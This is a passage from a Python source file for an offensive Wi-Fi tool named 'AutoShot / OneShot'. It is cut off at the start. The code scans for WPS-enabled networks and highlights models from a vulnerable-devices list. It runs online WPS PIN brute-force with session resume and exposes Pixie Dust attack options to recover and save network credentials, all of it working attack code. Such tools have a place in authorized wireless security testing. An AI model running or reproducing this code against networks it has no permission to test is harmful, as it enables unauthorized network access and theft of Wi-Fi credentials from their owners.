            pin = f'{f_half}{s_half}{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                return self._second_half_bruteforce(bssid, f_half, s_half)
            s_half = str(int(s_half) + 1).zfill(3)
            if self.bruteforce:
                self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def _save_session(self, bssid, mask):
        filename = os.path.join(self.sessions_dir, f"{bssid.replace(':', '').upper()}.run")
        with open(filename, 'w') as f:
            f.write(mask)
        print(f'[i] Session saved in {filename}')

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        """Online brute-force with session resume."""
        self.bruteforce = BruteforceStatus()
        mask = start_pin if start_pin and len(start_pin) >= 4 else '0000'

        # Try restoring session
        if not start_pin:
            session_file = os.path.join(self.sessions_dir, f"{bssid.replace(':', '').upper()}.run")
            if os.path.isfile(session_file):
                with open(session_file, 'r') as f:
                    saved_mask = f.readline().strip()
                if input(f'[?] Restore previous session for {bssid}? [n/Y] ').lower() != 'n':
                    mask = saved_mask

        try:
            if len(mask) == 4:
                f_half = self._first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self._second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self._second_half_bruteforce(bssid, f_half, s_half, delay)
        except KeyboardInterrupt:
            print("\nAborting…")
            self._save_session(bssid, self.bruteforce.mask)
            raise

    def cleanup(self):
        try:
            if self.retsock:
                self.retsock.close()
            if self.wpas:
                self.wpas.terminate()
            if os.path.exists(self.res_socket_file):
                os.remove(self.res_socket_file)
            shutil.rmtree(self.tempdir, ignore_errors=True)
            os.remove(self.tempconf)
        except Exception:
            pass

    def __del__(self):
        self.cleanup()


# ---------- WiFiScanner ----------
class WiFiScanner:
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list
        reports_fname = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports', 'stored.csv')
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as f:
                csv_reader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csv_reader)
                self.stored = [(row[1], row[2]) for row in csv_reader]
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Optional[Dict[int, dict]]:
        cmd = ['iw', 'dev', self.interface, 'scan']
        proc = subprocess.run(cmd, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT,
                              encoding='utf-8', errors='replace')
        if proc.returncode != 0:
            print('[!] iw scan failed:', proc.stdout)
            return None

        lines = proc.stdout.splitlines()
        networks = []
        matchers = [
            (re.compile(r'BSS (\S+)( )?\(on \w+\)'), self._handle_network),
            (re.compile(r'SSID: (.*)'), self._handle_essid),
            (re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'), self._handle_level),
            (re.compile(r'(capability): (.+)'), self._handle_security_type),
            (re.compile(r'(RSN):\t [*] Version: (\d+)'), self._handle_security_type),
            (re.compile(r'(WPA):\t [*] Version: (\d+)'), self._handle_security_type),
            (re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'), self._handle_wps),
            (re.compile(r' [*] AP setup locked: (0x[0-9]+)'), self._handle_wps_locked),
            (re.compile(r' [*] Model: (.*)'), self._handle_model),
            (re.compile(r' [*] Model Number: (.*)'), self._handle_model_number),
            (re.compile(r' [*] Device name: (.*)'), self._handle_device_name)
        ]

        networks.append({
            'Security type': 'Unknown',
            'WPS': False,
            'WPS locked': False,
            'Model': '',
            'Model number': '',
            'Device name': '',
            'BSSID': '',
            'ESSID': '',
            'Level': 0
        })

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return None
            line = line.strip('\t')
            for regexp, handler in matchers:
                res = re.match(regexp, line)
                if res:
                    handler(res, networks)

        networks = [n for n in networks if n.get('WPS', False)]
        if not networks:
            return None

        networks.sort(key=lambda x: x.get('Level', -100), reverse=True)
        network_dict = {i+1: net for i, net in enumerate(networks)}
        self._print_scan_table(network_dict)
        return network_dict

    def _handle_network(self, match, networks):
        networks.append({
            'Security type': 'Unknown',
            'WPS': False,
            'WPS locked': False,
            'Model': '',
            'Model number': '',
            'Device name': '',
            'BSSID': match.group(1).upper(),
            'ESSID': '',
            'Level': 0
        })

    def _handle_essid(self, match, networks):
        raw = match.group(1)
        try:
            networks[-1]['ESSID'] = raw.encode('latin1').decode('utf-8', errors='replace')
        except:
            networks[-1]['ESSID'] = raw

    def _handle_level(self, match, networks):
        networks[-1]['Level'] = int(float(match.group(1)))

    def _handle_security_type(self, match, networks):
        sec = networks[-1]['Security type']
        if match.group(1) == 'capability':
            if 'Privacy' in match.group(2):
                sec = 'WEP'
            else:
                sec = 'Open'
        elif sec == 'WEP':
            if match.group(1) == 'RSN':
                sec = 'WPA2'
            elif match.group(1) == 'WPA':
                sec = 'WPA'
        elif sec == 'WPA':
            if match.group(1) == 'RSN':
                sec = 'WPA/WPA2'
        elif sec == 'WPA2':
            if match.group(1) == 'WPA':
                sec = 'WPA/WPA2'
        networks[-1]['Security type'] = sec

    def _handle_wps(self, match, networks):
        networks[-1]['WPS'] = True

    def _handle_wps_locked(self, match, networks):
        networks[-1]['WPS locked'] = bool(int(match.group(1), 16))

    def _handle_model(self, match, networks):
        networks[-1]['Model'] = match.group(1)

    def _handle_model_number(self, match, networks):
        networks[-1]['Model number'] = match.group(1)

    def _handle_device_name(self, match, networks):
        networks[-1]['Device name'] = match.group(1)

    def _print_scan_table(self, network_dict):
        def truncate_str(s, length, postfix="…"):
            if not s:
                return ' ' * length
            original_width = wcwidth.wcswidth(s)
            if original_width <= length:
                return s + ' ' * (length - original_width)
            postfix_width = wcwidth.wcswidth(postfix)
            max_allowed = length - postfix_width
            current_width = 0
            truncated = []
            for c in s:
                char_width = wcwidth.wcswidth(c)
                if current_width + char_width > max_allowed:
                    break
                truncated.append(c)
                current_width += char_width
            result = "".join(truncated)
            if len(truncated) < len(s):
                result += postfix
            result_width = wcwidth.wcswidth(result)
            if result_width > length:
                result = result[:length-1] + postfix
                result_width = wcwidth.wcswidth(result)
            if result_width < length:
                result += ' ' * (length - result_width)
            return result

        def colored(text, color=None):
            if color == 'green':
                return f'\033[92m{text}\033[00m'
            elif color == 'red':
                return f'\033[91m{text}\033[00m'
            elif color == 'yellow':
                return f'\033[93m{text}\033[00m'
            return text

        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('Possibly vulnerable', 'green'),
                colored('WPS locked', 'red'),
                colored('Already stored', 'yellow')
            ))
        print('Networks list:')
        header = f"{'#':<4} {'BSSID':<18} {'ESSID':<25} {'Sec.':<8} {'PWR':<4} {'WSC device name':<27} {'WSC model'}"
        print(header)

        items = list(network_dict.items())
        if args.reverse_scan:
            items = reversed(items)

        for n, network in items:
            number = f'{n})'
            essid = truncate_str(network.get('ESSID', 'HIDDEN'), 25)
            device = truncate_str(network.get('Device name', ''), 27)
            model = f"{network.get('Model', '')} {network.get('Model number', '')}".strip()
            line = (f"{number:<4} {network['BSSID']:<18} {essid} "
                    f"{network['Security type']:<8} {str(network['Level']):<4} "
                    f"{device} {model}")
            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, 'yellow'))
            elif network.get('WPS locked', False):
                print(colored(line, 'red'))
            elif self.vuln_list and model in self.vuln_list:
                print(colored(line, 'green'))
            else:
                print(line)

    def prompt_network(self) -> Optional[str]:
        networks = self.iw_scanner()
        if not networks:
            print('[-] No WPS networks found.')
            return None
        while True:
            try:
                choice = input('Select target (press Enter to refresh): ')
                if choice.lower() in ('r', '0', ''):
                    return self.prompt_network()
                idx = int(choice)
                if idx in networks:
                    return networks[idx]['BSSID']
                else:
                    raise IndexError
            except (ValueError, IndexError):
                print('Invalid number')


# ---------- Helper functions ----------
def iface_up(iface, down=False):
    action = 'down' if down else 'up'
    cmd = ['ip', 'link', 'set', iface, action]
    return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


# ---------- Main ----------
if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='AutoShot / OneShot – WPS brute‑force tool',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
    )
    parser.add_argument('-i', '--interface', required=True, help='Interface name')
    parser.add_argument('-b', '--bssid', help='Target BSSID')
    parser.add_argument('-p', '--pin', help='Use specific PIN')
    parser.add_argument('-K', '--pixie-dust', action='store_true', help='Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true', help='Force full range in pixiewps')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true', help='Show pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true', help='Online brute-force')
    parser.add_argument('--pbc', action='store_true', help='Push button connect')
    parser.add_argument('-d', '--delay', type=float, help='Delay between PIN attempts')
    parser.add_argument('-w', '--write', action='store_true', help='Save credentials on success')
    parser.add_argument('--iface-down', action='store_true', help='Bring interface down on exit')
    parser.add_argument('--vuln-list', default=os.path.join(os.path.dirname(os.path.realpath(__file__)), 'vulnwsc.txt'),
                        help='Vulnerable devices list file')
    parser.add_argument('-l', '--loop', action='store_true', help='Loop after each attack')
    parser.add_argument('-r', '--reverse-scan', action='store_true', help='Reverse scan order')
    parser.add_argument('--mtk-wifi', action='store_true', help='Enable MediaTek Wi-Fi device')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("Python 3.6 or higher required")

    # Check for root/admin privileges (Unix-like systems only)
    if hasattr(os, 'getuid') and os.getuid() != 0:
        die("Run as root (use sudo)")

    # Check required binaries
    for bin_name in ['iw', 'wpa_supplicant', 'pixiewps']:
        if not _check_binary(bin_name):
            die(f'Required binary "{bin_name}" not found in PATH')

    if args.mtk_wifi:
        wmt_path = Path("/dev/wmtWifi")
        if not wmt_path.is_char_device():
            die("/dev/wmtWifi not found or not a character device")
        wmt_path.chmod(0o644)
        wmt_path.write_text("1")

    if not iface_up(args.interface):
        die(f'Unable to bring up interface "{args.interface}"')

    while True:
        try:
            companion = Companion(args.interface, args.write, args.verbose)
            if args.pbc:
                if not args.bssid:
                    scanner = WiFiScanner(args.interface)
                    args.bssid = scanner.prompt_network()
                if args.bssid:
                    companion.single_connection(args.bssid, pbc_mode=True)
            else:
                if not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as f:
                            vuln_list = f.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list)
                    if not args.loop:
                        print('[*] BSSID not specified — scanning for networks')
                    args.bssid = scanner.prompt_network()
                    if not args.bssid:
                        if args.loop:
                            continue
                        else:
                            break

                if args.bssid:
                    companion = Companion(args.interface, args.write, args.verbose)
                    if args.bruteforce:
                        companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                    else:
                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.pbc,
                                                    args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input("\n[?] Exit script? [N/y] ").lower() == 'y':
                    print("Aborting…")
                    break
                else:
                    args.bssid = None
            else:
                print("\nAborting…")
                break

    if args.iface_down:
        iface_up(args.interface, down=True)

    if args.mtk_wifi:
        Path("/dev/wmtWifi").write_text("0")